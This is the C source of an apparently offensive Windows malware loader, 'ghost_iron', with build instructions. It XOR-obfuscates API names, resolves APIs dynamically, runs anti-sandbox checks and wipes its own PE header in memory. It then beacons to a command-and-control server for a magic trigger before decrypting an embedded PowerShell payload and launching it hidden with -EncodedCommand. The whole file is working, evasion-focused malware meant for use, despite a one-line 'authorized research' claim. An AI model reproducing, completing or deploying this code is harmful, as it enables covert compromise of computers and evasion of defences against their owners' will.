/*
 * ghost_iron.c -- Polymorphic PS1 Loader v4 | CHEYANNE x iron-sun
 * Polymorph: ghost_loader (PS1 -EncodedCommand) x iron-sun (evasion stack)
 * 22DIV / george wu -- CSEC research, authorized hardware only
 *
 * POLYMORPH STACK (ordered, all must pass before PS1 fires):
 *   [1] XOR string obfuscation (key 0xAB)   -- API names + DLL names encrypted in .rdata
 *   [2] Dynamic API resolution               -- GetProcAddress chain; minimal static IAT
 *   [3] Anti-sandbox                         -- timing + screen res + disk size
 *   [4] PE header stomp                      -- ZeroMemory first 0x400 bytes in-memory
 *   [5] Magic auth (optional)                -- listener sends ISUN before PS1 fires
 *   [6] Jitter                               -- GetTickCount-based random delay before launch
 *   [7] gcc/MinGW PE                         -- different IAT/PE structure from MSVC ghost_loader
 *
 * Ghost Loader core (retained from ghost_loader_template.c):
 *   - XOR-encrypted PS1 payload baked in (separate key, injected by build script)
 *   - MultiByteToWideChar UTF-16LE encoding
 *   - CryptBinaryToStringA base64
 *   - powershell -NoP -NonI -W Hidden -EncodedCommand
 *
 * Build (gcc 15.x MinGW):
 *   python shell/make_ghost_iron.py <ps1_file> <c2_ip> <c2_port> [xor_key]
 *   -- generates ghost_iron_out.c, then:
 *   gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 -mwindows
 *
 * Set C2_PORT 0 for standalone mode (no magic auth -- PS1 fires immediately after sandbox checks).
 *
 * Regenerate any XOR-encoded name (key 0xAB):
 *   python -c "s='ApiName'; print(','.join(hex(ord(c)^0xAB) for c in s))"
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <string.h>

/* ── BUILD-TIME CONFIG (injected by make_ghost_iron.py) ── */
#ifndef XOR_KEY
#define XOR_KEY     0xCD
#endif
#ifndef C2_PORT
#define C2_PORT     0
#endif
#define XK_STR      0xAB
#define RECONN_MS   5000
#define MIN_SW      800
#define MIN_DISK_GB 50ULL

/* Magic auth bytes: "ISUN" */
static const unsigned char MAGIC[4] = {0x49,0x53,0x55,0x4E};

/* ── XOR-encrypted PS1 payload (injected at build time) ── */
#ifndef PAYLOAD_DEFINED
static const unsigned char PAYLOAD_ENC[] = {0x00};
#define PAYLOAD_LEN 0
#endif

/* ── XOR-encrypted C2 IP (injected at build time) ── */
#ifndef C2_IP_DEFINED
static const unsigned char xC2Ip[] = {0x00};
#define xC2IpLen 0
#endif

/* ── Function pointer typedefs ── */
typedef VOID    (WINAPI *FN_Sleep)(DWORD);
typedef DWORD   (WINAPI *FN_GTC)(void);
typedef BOOL    (WINAPI *FN_GDFS)(LPCSTR,PULARGE_INTEGER,PULARGE_INTEGER,PULARGE_INTEGER);
typedef BOOL    (WINAPI *FN_VP)(LPVOID,SIZE_T,DWORD,PDWORD);
typedef BOOL    (WINAPI *FN_CPA)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,
                                  BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef int     (WINAPI *FN_MBWC)(UINT,DWORD,LPCSTR,int,LPWSTR,int);
typedef DWORD   (WINAPI *FN_WFSO)(HANDLE,DWORD);
typedef BOOL    (WINAPI *FN_CH)(HANDLE);
typedef BOOL    (WINAPI *FN_CBS)(const BYTE*,DWORD,DWORD,LPSTR,DWORD*);
typedef int     (WINAPI *FN_GSM)(int);
typedef LPVOID  (WINAPI *FN_HA)(HANDLE,DWORD,SIZE_T);
typedef BOOL    (WINAPI *FN_HF)(HANDLE,DWORD,LPVOID);
typedef HANDLE  (WINAPI *FN_GPH)(void);
typedef int     (WINAPI *FN_WSASt)(WORD,LPVOID);
typedef SOCKET  (WINAPI *FN_Sock)(int,int,int);
typedef int     (WINAPI *FN_Conn)(SOCKET,const struct sockaddr*,int);
typedef int     (WINAPI *FN_Recv)(SOCKET,char*,int,int);
typedef int     (WINAPI *FN_CS)(SOCKET);
typedef unsigned long (WINAPI *FN_InetA)(const char*);
typedef u_short (WINAPI *FN_Htons)(u_short);
typedef int     (WINAPI *FN_WSACl)(void);

/* ── [1] XOR-encoded DLL and API names (key 0xAB) ── */

/* "kernel32.dll" (12) */
static const unsigned char xk32[]   = {0xC0,0xCE,0xD9,0xC5,0xCE,0xC7,0x98,0x99,0x85,0xCF,0xC7,0xC7};
#define xk32Len 12

/* "crypt32.dll" (11) */
static const unsigned char xcr32[]  = {0xC8,0xD9,0xD2,0xDB,0xDF,0x98,0x99,0x85,0xCF,0xC7,0xC7};
#define xcr32Len 11

/* "user32.dll" (10) */
static const unsigned char xu32[]   = {0xDE,0xD8,0xCE,0xD9,0x98,0x99,0x85,0xCF,0xC7,0xC7};
#define xu32Len 10

/* "ws2_32.dll" (10) */
static const unsigned char xws2[]   = {0xDC,0xD8,0x99,0xF4,0x98,0x99,0x85,0xCF,0xC7,0xC7};
#define xws2Len 10

/* "C:\" (3) */
static const unsigned char xDisk[]  = {0xE8,0x91,0xF7};

/* "Sleep" (5) */
static const unsigned char xSleep[] = {0xF8,0xC7,0xCE,0xCE,0xDB};
#define xSleepLen 5

/* "GetTickCount" (12) */
static const unsigned char xGTC[]   = {0xEC,0xCE,0xDF,0xFF,0xC2,0xC8,0xC0,0xE8,0xC4,0xDE,0xC5,0xDF};
#define xGTCLen 12

/* "GetDiskFreeSpaceExA" (19) */
static const unsigned char xGDFS[]  = {0xEC,0xCE,0xDF,0xEF,0xC2,0xD8,0xC0,0xED,0xD9,0xCE,0xCE,0xF8,0xDB,0xCA,0xC8,0xCE,0xEE,0xD3,0xEA};
#define xGDFSLen 19

/* "VirtualProtect" (14) */
static const unsigned char xVP[]    = {0xFD,0xC2,0xD9,0xDF,0xDE,0xCA,0xC7,0xFB,0xD9,0xC4,0xDF,0xCE,0xC8,0xDF};
#define xVPLen 14

/* "MultiByteToWideChar" (19) */
static const unsigned char xMBWC[]  = {0xE6,0xDE,0xC7,0xDF,0xC2,0xE9,0xD2,0xDF,0xCE,0xFF,0xC4,0xFC,0xC2,0xCF,0xCE,0xE8,0xC3,0xCA,0xD9};
#define xMBWCLen 19

/* "CreateProcessW" (14) */
static const unsigned char xCPA[]   = {0xE8,0xD9,0xCE,0xCA,0xDF,0xCE,0xFB,0xD9,0xC4,0xC8,0xCE,0xD8,0xD8,0xFC};
#define xCPALen 14

/* "WaitForSingleObject" (19) */
static const unsigned char xWFSO[]  = {0xFC,0xCA,0xC2,0xDF,0xED,0xC4,0xD9,0xF8,0xC2,0xC5,0xCC,0xC7,0xCE,0xE4,0xC9,0xC1,0xCE,0xC8,0xDF};
#define xWFSOLen 19

/* "CloseHandle" (11) */
static const unsigned char xCH[]    = {0xE8,0xC7,0xC4,0xD8,0xCE,0xE3,0xCA,0xC5,0xCF,0xC7,0xCE};
#define xCHLen 11

/* "HeapAlloc" (9) */
static const unsigned char xHA[]    = {0xE3,0xCE,0xCA,0xDB,0xEA,0xC7,0xC7,0xC4,0xC8};
#define xHALen 9

/* "HeapFree" (8) */
static const unsigned char xHF[]    = {0xE3,0xCE,0xCA,0xDB,0xED,0xD9,0xCE,0xCE};
#define xHFLen 8

/* "GetProcessHeap" (14) */
static const unsigned char xGPH[]   = {0xEC,0xCE,0xDF,0xFB,0xD9,0xC4,0xC8,0xCE,0xD8,0xD8,0xE3,0xCE,0xCA,0xDB};
#define xGPHLen 14

/* "CryptBinaryToStringA" (20) */
static const unsigned char xCBS[]   = {0xE8,0xD9,0xD2,0xDB,0xDF,0xE9,0xC2,0xC5,0xCA,0xD9,0xD2,0xFF,0xC4,0xF8,0xDF,0xD9,0xC2,0xC5,0xCC,0xEA};
#define xCBSLen 20

/* "GetSystemMetrics" (16) */
static const unsigned char xGSM[]   = {0xEC,0xCE,0xDF,0xF8,0xD2,0xD8,0xDF,0xCE,0xC6,0xE6,0xCE,0xDF,0xD9,0xC2,0xC8,0xD8};
#define xGSMLen 16

/* "GetModuleHandleA" (16) */
static const unsigned char xGMH[]   = {0xEC,0xCE,0xDF,0xE6,0xC4,0xCF,0xDE,0xC7,0xCE,0xE3,0xCA,0xC5,0xCF,0xC7,0xCE,0xEA};
#define xGMHLen 16

/* "WSAStartup" (10) */
static const unsigned char xWSASt[] = {0xFC,0xF8,0xEA,0xF8,0xDF,0xCA,0xD9,0xDF,0xDE,0xDB};
#define xWSAStLen 10

/* "socket" (6) */
static const unsigned char xSock[]  = {0xD8,0xC4,0xC8,0xC0,0xCE,0xDF};
#define xSockLen 6

/* "connect" (7) */
static const unsigned char xConn[]  = {0xC8,0xC4,0xC5,0xC5,0xCE,0xC8,0xDF};
#define xConnLen 7

/* "recv" (4) */
static const unsigned char xRecv[]  = {0xD9,0xCE,0xC8,0xDD};
#define xRecvLen 4

/* "closesocket" (11) */
static const unsigned char xCSock[] = {0xC8,0xC7,0xC4,0xD8,0xCE,0xD8,0xC4,0xC8,0xC0,0xCE,0xDF};
#define xCSockLen 11

/* "inet_addr" (9) */
static const unsigned char xInetA[] = {0xC2,0xC5,0xCE,0xDF,0xF4,0xCA,0xCF,0xCF,0xD9};
#define xInetALen 9

/* "htons" (5) */
static const unsigned char xHtons[] = {0xC3,0xDF,0xC4,0xC5,0xD8};
#define xHtonsLen 5

/* "WSACleanup" (10) */
static const unsigned char xWSACl[] = {0xFC,0xF8,0xEA,0xE8,0xC7,0xCE,0xCA,0xDE,0xDB,0xCA};
#define xWSAClLen 10

/* ── Helpers ── */
static void xd(char *dst, const unsigned char *src, int n) {
    int i;
    for (i = 0; i < n; i++) dst[i] = (char)(src[i] ^ XK_STR);
    dst[n] = '\0';
}

static void wzero(volatile void *p, SIZE_T n) {
    volatile char *v = (volatile char *)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

static WCHAR *wadd(WCHAR *dst, const WCHAR *src) {
    while (*dst) dst++;
    while ((*dst++ = *src++));
    return dst - 1;
}

/* ── [4] PE header stomp ── */
static void stomp_pe(FN_VP fn_vp) {
    HMODULE h = GetModuleHandleA(NULL);
    if (!h) return;
    DWORD old;
    if (fn_vp((LPVOID)h, 0x400, PAGE_READWRITE, &old)) {
        wzero((volatile void *)h, 0x400);
        fn_vp((LPVOID)h, 0x400, old, &old);
    }
}

/* ── [3] Anti-sandbox ── */
static int sandbox_ok(HMODULE hK32, HMODULE hU32) {
    char nb[32];
    DWORD t1, t2;
    ULARGE_INTEGER fa, tb, tf;

    xd(nb, xSleep, xSleepLen);
    FN_Sleep fn_sl = (FN_Sleep)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xGTC, xGTCLen);
    FN_GTC fn_gtc = (FN_GTC)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xGDFS, xGDFSLen);
    FN_GDFS fn_gdfs = (FN_GDFS)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xGSM, xGSMLen);
    FN_GSM fn_gsm = hU32 ? (FN_GSM)GetProcAddress(hU32, nb) : NULL; wzero(nb, 32);

    if (!fn_sl || !fn_gtc) return 0;

    /* [3a] Timing */
    t1 = fn_gtc(); fn_sl(5000); t2 = fn_gtc();
    if ((t2 - t1) < 4500) return 0;

    /* [3b] Screen width */
    if (fn_gsm) {
        int sw = fn_gsm(0);
        if (sw > 0 && sw < MIN_SW) return 0;
    }

    /* [3c] Disk size */
    if (fn_gdfs) {
        char drv[8];
        xd(drv, xDisk, 3); drv[3] = '\0';
        if (fn_gdfs(drv, &fa, &tb, &tf)) {
            ULONGLONG gb = tb.QuadPart / (1024ULL * 1024ULL * 1024ULL);
            if (gb < MIN_DISK_GB) { wzero(drv, 8); return 0; }
        }
        wzero(drv, 8);
    }
    return 1;
}

/* ── [5] Magic auth ── */
static void magic_auth(FN_Sleep fn_sl, FN_GTC fn_gtc) {
    if (C2_PORT == 0) return;

    char nb[32];
    char ip[64];
    int i;

    /* Decode C2 IP (XOR key 0xAB) */
    for (i = 0; i < (int)xC2IpLen; i++) ip[i] = (char)(xC2Ip[i] ^ XK_STR);
    ip[xC2IpLen] = '\0';

    char dllbuf[20]; xd(dllbuf, xws2, xws2Len);
    HMODULE hWs = LoadLibraryA(dllbuf); wzero(dllbuf, 20);
    if (!hWs) goto done;

    xd(nb, xWSASt, xWSAStLen); FN_WSASt fn_wsa = (FN_WSASt)GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xSock,  xSockLen);  FN_Sock fn_s    = (FN_Sock) GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xConn,  xConnLen);  FN_Conn fn_c    = (FN_Conn) GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xRecv,  xRecvLen);  FN_Recv fn_r    = (FN_Recv) GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xCSock, xCSockLen); FN_CS fn_cs     = (FN_CS)   GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xInetA, xInetALen); FN_InetA fn_ia  = (FN_InetA)GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xHtons, xHtonsLen); FN_Htons fn_ht  = (FN_Htons)GetProcAddress(hWs, nb); wzero(nb,32);
    xd(nb, xWSACl, xWSAClLen); FN_WSACl fn_wsc = (FN_WSACl)GetProcAddress(hWs, nb); wzero(nb,32);

    if (!fn_wsa || !fn_s || !fn_c || !fn_r || !fn_cs || !fn_ia || !fn_ht) goto done;

    WSADATA wsa;
    if (fn_wsa(MAKEWORD(2,2), &wsa) != 0) goto done;

    for (;;) {
        if (fn_sl && fn_gtc) fn_sl(1000 + (fn_gtc() % 3000));

        SOCKET s = fn_s(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) { fn_sl(RECONN_MS); continue; }

        struct sockaddr_in sa;
        sa.sin_family      = AF_INET;
        sa.sin_port        = fn_ht((u_short)C2_PORT);
        sa.sin_addr.s_addr = fn_ia(ip);
        memset(sa.sin_zero, 0, sizeof(sa.sin_zero));

        if (fn_c(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
            fn_cs(s); fn_sl(RECONN_MS); continue;
        }

        char mbuf[8] = {0};
        int got = 0;
        while (got < 4) {
            int n = fn_r(s, mbuf + got, 4 - got, 0);
            if (n <= 0) break;
            got += n;
        }
        fn_cs(s);

        if (got == 4 &&
            (unsigned char)mbuf[0] == MAGIC[0] &&
            (unsigned char)mbuf[1] == MAGIC[1] &&
            (unsigned char)mbuf[2] == MAGIC[2] &&
            (unsigned char)mbuf[3] == MAGIC[3]) {
            wzero(mbuf, 8);
            if (fn_wsc) fn_wsc();
            goto done;
        }
        wzero(mbuf, 8);
        fn_sl(RECONN_MS);
    }

done:
    wzero(ip, 64);
}

/* ── PowerShell command builder ── */
static void build_pscmd(WCHAR *out, const WCHAR *b64) {
    /* "powershell" XOR 0x01 */
    static const unsigned char xps[] = {0x71,0x6E,0x76,0x64,0x73,0x72,0x69,0x64,0x6D,0x6D};
    /* " -NoP -NonI -W Hidden -EncodedCommand" XOR 0x21 */
    static const unsigned char xfl[] = {
        0x01,0x0C,0x6F,0x4E,0x71,0x01,0x0C,0x6F,0x4E,0x4F,0x68,0x01,
        0x0C,0x76,0x01,0x69,0x48,0x45,0x45,0x44,0x4F,0x01,0x0C,0x64,
        0x4F,0x42,0x4E,0x45,0x44,0x45,0x62,0x4E,0x4C,0x4C,0x40,0x4F,0x45
    };
    WCHAR ps[16], fl[48];
    DWORD j;
    for (j = 0; j < 10; j++) ps[j] = (WCHAR)(xps[j] ^ 0x01); ps[10] = L'\0';
    for (j = 0; j < 37; j++) fl[j] = (WCHAR)(xfl[j] ^ 0x21); fl[37] = L'\0';

    out[0] = L'\0';
    wadd(out, ps);
    wadd(out, fl);
    wadd(out, L" ");
    wadd(out, b64);
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int n)
{
    char nb[32];
    char dllbuf[20];
    DWORD i;

    /* [2] Resolve kernel32 and user32 dynamically */
    xd(dllbuf, xk32, xk32Len);
    HMODULE hK32 = LoadLibraryA(dllbuf); wzero(dllbuf, 20);
    if (!hK32) return 1;

    xd(dllbuf, xu32, xu32Len);
    HMODULE hU32 = LoadLibraryA(dllbuf); wzero(dllbuf, 20);

    /* [3] Anti-sandbox gate -- bail silently before ANY payload activity */
    if (!sandbox_ok(hK32, hU32)) return 0;

    /* Resolve VirtualProtect for stomp */
    xd(nb, xVP, xVPLen);
    FN_VP fn_vp = (FN_VP)GetProcAddress(hK32, nb); wzero(nb, 32);

    /* [4] PE header stomp */
    if (fn_vp) stomp_pe(fn_vp);

    /* Re-resolve Sleep and GTC */
    xd(nb, xSleep, xSleepLen);
    FN_Sleep fn_sl = (FN_Sleep)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xGTC, xGTCLen);
    FN_GTC fn_gtc = (FN_GTC)GetProcAddress(hK32, nb); wzero(nb, 32);

    /* [5] Magic auth */
    magic_auth(fn_sl, fn_gtc);

    /* Resolve remaining APIs */
    xd(nb, xMBWC, xMBWCLen);
    FN_MBWC fn_mbwc = (FN_MBWC)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xCPA, xCPALen);
    FN_CPA fn_cpa = (FN_CPA)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xWFSO, xWFSOLen);
    FN_WFSO fn_wfso = (FN_WFSO)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xCH, xCHLen);
    FN_CH fn_ch = (FN_CH)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xHA, xHALen);
    FN_HA fn_ha = (FN_HA)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xHF, xHFLen);
    FN_HF fn_hf = (FN_HF)GetProcAddress(hK32, nb); wzero(nb, 32);
    xd(nb, xGPH, xGPHLen);
    FN_GPH fn_gph = (FN_GPH)GetProcAddress(hK32, nb); wzero(nb, 32);

    xd(dllbuf, xcr32, xcr32Len);
    HMODULE hCr32 = LoadLibraryA(dllbuf); wzero(dllbuf, 20);
    xd(nb, xCBS, xCBSLen);
    FN_CBS fn_cbs = hCr32 ? (FN_CBS)GetProcAddress(hCr32, nb) : NULL; wzero(nb, 32);

    if (!fn_mbwc || !fn_cpa || !fn_wfso || !fn_ch || !fn_ha || !fn_hf || !fn_gph || !fn_cbs)
        return 1;

    HANDLE heap = fn_gph();

    /* ── Decrypt PS1 payload ── */
    DWORD plen = (DWORD)PAYLOAD_LEN;
    unsigned char *raw = (unsigned char *)fn_ha(heap, 0, plen + 2);
    if (!raw) return 1;
    for (i = 0; i < plen; i++) raw[i] = PAYLOAD_ENC[i] ^ (unsigned char)XOR_KEY;
    raw[plen] = '\0';

    /* ── UTF-8 to UTF-16LE ── */
    int wlen = fn_mbwc(CP_UTF8, 0, (LPCSTR)raw, (int)plen, NULL, 0);
    WCHAR *ws = (WCHAR *)fn_ha(heap, 0, (wlen + 1) * sizeof(WCHAR));
    if (!ws) { wzero(raw, plen); fn_hf(heap, 0, raw); return 1; }
    fn_mbwc(CP_UTF8, 0, (LPCSTR)raw, (int)plen, ws, wlen);
    ws[wlen] = L'\0';
    wzero(raw, plen); fn_hf(heap, 0, raw);

    /* ── Base64-encode UTF-16LE bytes ── */
    DWORD b64len = 0;
    fn_cbs((BYTE *)ws, (DWORD)(wlen * sizeof(WCHAR)),
           CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64len);
    char *b64a = (char *)fn_ha(heap, 0, b64len + 2);
    if (!b64a) { wzero(ws, wlen*sizeof(WCHAR)); fn_hf(heap, 0, ws); return 1; }
    fn_cbs((BYTE *)ws, (DWORD)(wlen * sizeof(WCHAR)),
           CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64a, &b64len);
    b64a[b64len] = '\0';
    wzero(ws, wlen * sizeof(WCHAR)); fn_hf(heap, 0, ws);

    /* ── ASCII b64 to wide ── */
    WCHAR *wb64 = (WCHAR *)fn_ha(heap, 0, (b64len + 2) * sizeof(WCHAR));
    if (!wb64) { wzero(b64a, b64len); fn_hf(heap, 0, b64a); return 1; }
    fn_mbwc(CP_ACP, 0, b64a, -1, wb64, (int)(b64len + 1));
    wzero(b64a, b64len); fn_hf(heap, 0, b64a);

    /* ── Build PowerShell command ── */
    DWORD cmdlen = b64len + 128;
    WCHAR *cmd = (WCHAR *)fn_ha(heap, 0, cmdlen * sizeof(WCHAR));
    if (!cmd) { wzero(wb64, b64len*sizeof(WCHAR)); fn_hf(heap, 0, wb64); return 1; }
    build_pscmd(cmd, wb64);
    wzero(wb64, b64len * sizeof(WCHAR)); fn_hf(heap, 0, wb64);

    /* ── [6] Jitter before launch ── */
    if (fn_sl && fn_gtc) fn_sl(300 + (fn_gtc() % 1200));

    /* ── Launch PowerShell hidden ── */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL ok = fn_cpa(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    wzero(cmd, cmdlen * sizeof(WCHAR)); fn_hf(heap, 0, cmd);

    if (ok) {
        fn_wfso(pi.hProcess, INFINITE);
        fn_ch(pi.hProcess);
        fn_ch(pi.hThread);
    }
    return 0;
}
